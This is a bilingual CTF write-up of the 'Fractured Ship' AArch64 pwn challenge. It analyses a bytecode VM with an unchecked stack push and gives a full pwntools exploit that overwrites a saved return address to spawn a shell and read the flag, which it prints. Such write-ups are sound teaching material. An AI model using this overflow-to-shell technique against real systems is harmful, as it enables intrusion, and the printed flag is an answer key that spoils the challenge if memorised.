# RITSEC CTF 2026 - Fractured Ship

## Category: PWN
- **Description**: *Things have gotten a little dreary, and we're fairly beat up now but so are they. We might have to resort to more drastic measures. Grapple onto the ship and take the flag and booty for ourselves!*
- **Server**: `nc marauder-might.ctf.ritsec.club 1739`

---

# [EN] English Version

## Binary Analysis

```
File:   ELF 64-bit LSB executable, ARM aarch64, statically linked, stripped
Arch:   aarch64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX enabled
PIE:    No PIE (0x400000)
```

The binary is an **AArch64 static executable**, stripped. No canary, no PIE - only NX is enabled.

## Reverse Engineering

### Protocol

Upon connection, the server sends a `interpreting\n` banner then waits for bytecode following this protocol:

1. **4 bytes** (uint32 LE): number of constants
2. **N * 8 bytes**: constants array (double type, 8 bytes each)
3. **Bytecodes**: reads one byte at a time from stdin, executed in the VM loop

### Bytecode VM

The binary implements a simple VM interpreter at `0x400890` with these opcodes:

| Opcode | Name | Description |
|--------|------|-------------|
| 0 | `OP_CONSTANT` | Reads 1 byte index, pushes `constants[index]` onto VM stack |
| 1 | `OP_RETURN` | Pops value, prints to stdout, exits interpreter |
| 2 | `OP_SVC` | Reads 1 byte sub-opcode: 0=getpid (push), 2=print_arg (pop+print) |

### Interpreter Stack Layout (`0x400890`)

```
sub sp, sp, #0x820          ; frame size = 0x820
stp x29, x30, [sp]          ; save x29/x30 at frame bottom

; VM stack pointer = sp + 0x10 (global at 0x4a1968)
; Each push: *stack_ptr = value; stack_ptr += 8
; NO bounds checking!

sp+0x000: saved x29 (interpreter)
sp+0x008: saved x30 (interpreter, returns to 0x4009c0)
sp+0x010: VM stack starts here, grows UPWARD
  ...
sp+0x810: local variable (temp double)
sp+0x818: local variable (index, sub-opcode, opcode, counter)
sp+0x820: ---- END OF FRAME ---- = saved x29 of caller (0x4009c0)
sp+0x828:                          saved x30 of caller (returns to main)
```

### Vulnerability: VM Stack Overflow

`OP_CONSTANT` pushes values onto the VM stack with **no bounds checking**. The VM stack starts at `sp+0x10` and grows upward. If we push enough values, we overwrite the caller's frame:

- **Push 258** (index 258): overwrites caller `0x4009c0`'s `x29`
- **Push 259** (index 259): overwrites caller `0x4009c0`'s `x30` (return address)

When the interpreter finishes (via `OP_RETURN`), it returns to caller `0x4009c0`. The caller executes:

```asm
ldp x29, x30, [sp], #0x20    ; loads overwritten x29/x30
ret                            ; jumps to the address we control
```

### Win Function

At `0x400780` there is a function that calls `system("/bin/sh")`:

```asm
0x400780: stp  x29, x30, [sp, #-0x10]!
0x400784: mov  x29, sp
0x400788: adrp x0, 0x45b000
0x40078c: add  x0, x0, #0x9a0       ; x0 = "/bin/sh"
0x400790: bl   0x402300              ; system("/bin/sh")
0x400794: nop
0x400798: ldp  x29, x30, [sp], #0x10
0x40079c: ret
```

**Important note**: We must jump to `0x400788` (skipping the `stp` prologue), not `0x400780`. Reason: when jumping via `ret`, register `x30` still holds the value `0x400780`. If we call from the function start, `stp` saves `x30=0x400780` to the stack, and when `system()` returns, `ldp` restores `x30=0x400780` then `ret` jumps back to `0x400780` - creating an infinite loop calling `system()` repeatedly, preventing the shell from working properly.

When jumping to `0x400788` (skipping `stp`), the epilogue `ldp x29, x30, [sp], #0x10` loads main's original values from the stack, allowing normal flow after the shell exits.

## Exploit

### Strategy

1. Declare 2 constants: `0.0` (padding) and `0x400788` (win function, encoded as raw double bytes)
2. Send 258 times `OP_CONSTANT(0)` to fill the VM stack
3. Send `OP_CONSTANT(0)` - overwrites caller x29 (value doesn't matter)
4. Send `OP_CONSTANT(1)` - overwrites caller x30 = `0x400788`
5. Send `OP_RETURN` to exit the interpreter, triggering return to win function
6. Shell spawned, read flag

### Script

```python
#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'aarch64'

WIN_FUNC = 0x400788  # adrp x0; add x0; bl system - skip stp prologue

def make_payload():
    header = struct.pack('<I', 2)                         # 2 constants
    constants = struct.pack('<d', 0.0)                    # [0] padding
    constants += struct.pack('<Q', WIN_FUNC)              # [1] win addr as raw double

    bytecodes = b'\x00\x00' * 258   # 258x OP_CONSTANT(0): fill VM stack
    bytecodes += b'\x00\x00'        # OP_CONSTANT(0): overwrite caller x29
    bytecodes += b'\x00\x01'        # OP_CONSTANT(1): overwrite caller x30 = 0x400788
    bytecodes += b'\x01'            # OP_RETURN: exit interpreter

    return header + constants + bytecodes

r = remote('marauder-might.ctf.ritsec.club', 1739)
r.recvuntil(b'interpreting\n')
r.send(make_payload())
r.recvline(timeout=5)  # OP_RETURN output

r.sendline(b'cat /app/flag.txt')
r.interactive()
```

### Result

```
$ python exploit.py
[+] Opening connection to marauder-might.ctf.ritsec.club on port 1739: Done
[*] Switching to interactive mode
RS{th3_G4rc1a_0F_gr4pp1in6}
```

## Summary

| Step | Details |
|------|---------|
| Vulnerability | VM stack overflow - no bounds checking on push |
| Technique | Overwrite caller's return address via 260 OP_CONSTANT pushes |
| Target | Win function at `0x400788`: `system("/bin/sh")` |
| Note | Jump to `0x400788` (skip prologue), not `0x400780` |

## Flag

```
RS{th3_G4rc1a_0F_gr4pp1in6}
```

---

# [VI] Phiên bản tiếng Việt

## Phân tích binary

```
File:   ELF 64-bit LSB executable, ARM aarch64, statically linked, stripped
Arch:   aarch64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX enabled
PIE:    No PIE (0x400000)
```

Binary là một **AArch64 static executable** đã stripped. Không có canary, không có PIE - chỉ có NX.

## Reverse Engineering

### Giao thức

Khi kết nối, server gửi banner `interpreting\n` rồi chờ nhận bytecode theo protocol:

1. **4 bytes** (uint32 LE): số lượng constants
2. **N * 8 bytes**: mảng constants (kiểu double, 8 bytes mỗi phần tử)
3. **Bytecodes**: đọc từng byte một từ stdin, thực thi trong vòng lặp VM

### Bytecode VM

Binary implement một VM interpreter đơn giản tại `0x400890` với các opcode:

| Opcode | Tên | Mô tả |
|--------|-----|-------|
| 0 | `OP_CONSTANT` | Đọc 1 byte index, push `constants[index]` lên VM stack |
| 1 | `OP_RETURN` | Pop giá trị, in ra stdout, thoát interpreter |
| 2 | `OP_SVC` | Đọc 1 byte sub-opcode: 0=getpid (push), 2=print_arg (pop+print) |

### Stack layout của interpreter (`0x400890`)

```
sub sp, sp, #0x820          ; frame size = 0x820
stp x29, x30, [sp]          ; save x29/x30 tại đáy frame

; VM stack pointer = sp + 0x10 (global tại 0x4a1968)
; Mỗi push: *stack_ptr = value; stack_ptr += 8
; KHÔNG có bounds checking!

sp+0x000: saved x29 (interpreter)
sp+0x008: saved x30 (interpreter, trở về 0x4009c0)
sp+0x010: VM stack bắt đầu ở đây, phát triển hướng LÊN
  ...
sp+0x810: biến local (temp double)
sp+0x818: biến local (index, sub-opcode, opcode, counter)
sp+0x820: ---- HẾT FRAME ---- = saved x29 của caller (0x4009c0)
sp+0x828:                        saved x30 của caller (return về main)
```

### Lỗ hổng: VM Stack Overflow

`OP_CONSTANT` push giá trị lên VM stack mà **không kiểm tra giới hạn**. VM stack bắt đầu tại `sp+0x10` và phát triển lên trên. Nếu push đủ nhiều, ta ghi đè lên frame của caller:

- **Push 258** (index 258): ghi đè `x29` của caller `0x4009c0`
- **Push 259** (index 259): ghi đè `x30` (return address) của caller `0x4009c0`

Khi interpreter kết thúc (qua `OP_RETURN`), nó trở về caller `0x4009c0`. Caller thực hiện:

```asm
ldp x29, x30, [sp], #0x20    ; load x29/x30 đã bị ghi đè
ret                            ; nhảy tới địa chỉ ta kiểm soát
```

### Win function

Tại `0x400780` có sẵn một hàm gọi `system("/bin/sh")`:

```asm
0x400780: stp  x29, x30, [sp, #-0x10]!
0x400784: mov  x29, sp
0x400788: adrp x0, 0x45b000
0x40078c: add  x0, x0, #0x9a0       ; x0 = "/bin/sh"
0x400790: bl   0x402300              ; system("/bin/sh")
0x400794: nop
0x400798: ldp  x29, x30, [sp], #0x10
0x40079c: ret
```

**Lưu ý quan trọng**: Phải nhảy tới `0x400788` (bỏ qua prologue `stp`), không phải `0x400780`. Lý do: khi nhảy qua `ret`, thanh ghi `x30` vẫn giữ giá trị `0x400780`. Nếu gọi từ đầu hàm, `stp` lưu `x30=0x400780` vào stack, và khi `system()` return, `ldp` khôi phục `x30=0x400780` rồi `ret` lại nhảy về `0x400780` - tạo vòng lặp vô hạn gọi `system()` liên tục khiến shell không hoạt động đúng.

Khi nhảy tới `0x400788` (bỏ qua `stp`), epilogue `ldp x29, x30, [sp], #0x10` sẽ load giá trị gốc của main từ stack, cho phép flow bình thường sau khi shell thoát.

## Exploit

### Chiến lược

1. Khai báo 2 constants: `0.0` (padding) và `0x400788` (win function, encode dưới dạng raw bytes của double)
2. Gửi 258 lần `OP_CONSTANT(0)` để lấp đầy VM stack
3. Gửi `OP_CONSTANT(0)` - ghi đè x29 caller (giá trị không quan trọng)
4. Gửi `OP_CONSTANT(1)` - ghi đè x30 caller = `0x400788`
5. Gửi `OP_RETURN` để thoát interpreter, kích hoạt return tới win function
6. Shell spawned, đọc flag

### Script

```python
#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'aarch64'

WIN_FUNC = 0x400788  # adrp x0; add x0; bl system - bỏ qua stp prologue

def make_payload():
    header = struct.pack('<I', 2)                         # 2 constants
    constants = struct.pack('<d', 0.0)                    # [0] padding
    constants += struct.pack('<Q', WIN_FUNC)              # [1] win addr as raw double

    bytecodes = b'\x00\x00' * 258   # 258x OP_CONSTANT(0): lấp đầy VM stack
    bytecodes += b'\x00\x00'        # OP_CONSTANT(0): ghi đè caller x29
    bytecodes += b'\x00\x01'        # OP_CONSTANT(1): ghi đè caller x30 = 0x400788
    bytecodes += b'\x01'            # OP_RETURN: thoát interpreter

    return header + constants + bytecodes

r = remote('marauder-might.ctf.ritsec.club', 1739)
r.recvuntil(b'interpreting\n')
r.send(make_payload())
r.recvline(timeout=5)  # OP_RETURN output

r.sendline(b'cat /app/flag.txt')
r.interactive()
```

### Kết quả

```
$ python exploit.py
[+] Opening connection to marauder-might.ctf.ritsec.club on port 1739: Done
[*] Switching to interactive mode
RS{th3_G4rc1a_0F_gr4pp1in6}
```

## Tóm tắt

| Bước | Chi tiết |
|------|----------|
| Lỗ hổng | VM stack overflow - không kiểm tra giới hạn khi push |
| Kỹ thuật | Ghi đè return address của caller qua 260 lần OP_CONSTANT push |
| Mục tiêu | Win function tại `0x400788`: `system("/bin/sh")` |
| Lưu ý | Nhảy tới `0x400788` (bỏ qua prologue), không phải `0x400780` |

## Flag

```
RS{th3_G4rc1a_0F_gr4pp1in6}
```
